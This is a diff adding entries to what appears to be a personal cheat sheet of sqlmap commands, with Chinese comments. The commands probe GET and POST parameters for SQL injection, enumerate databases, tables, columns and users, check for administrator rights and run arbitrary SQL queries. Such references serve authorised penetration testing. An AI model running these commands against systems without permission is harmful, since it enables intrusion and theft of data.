@@ -2,3 +2,32 @@
 
 # sqlmap 从文件中导入 sqlmap import file
 sqlmap -r <file_name>
+
+# 测试 GET 的参数注入
+sqlmap -u <url> -p <var>  --dbs
+
+# 测试 POST  注入
+sqlmap -r <POST_FILE> -p <var> --proxy=socks5://127.0.0.1:7890 --random-agent --level 3 --dbs
+
+# 显示数据库
+sqlmap -u <url> -p <var> --dbs
+
+# 显示数据库的表
+sqlmap -u <url> -p <var> -D <dbs> --tables
+
+# 显示列名
+sqlmap -u <url> -p <var> -D <db_name> -T <tables> --columns
+
+# 查询当前用户
+sqlmap -u <url> -p <var> --users
+
+# 查询当前用户是否为管理员
+sqlmap -u <url> -p <var> --id-dba
+
+# 显示数据库的主机名
+sqlmap -u <url> -p <var> --hostname
+
+# 执行自定义的 sql 语句
+sqlmap -u <url> -p <var> --sql-query=<sql>
+
+# 
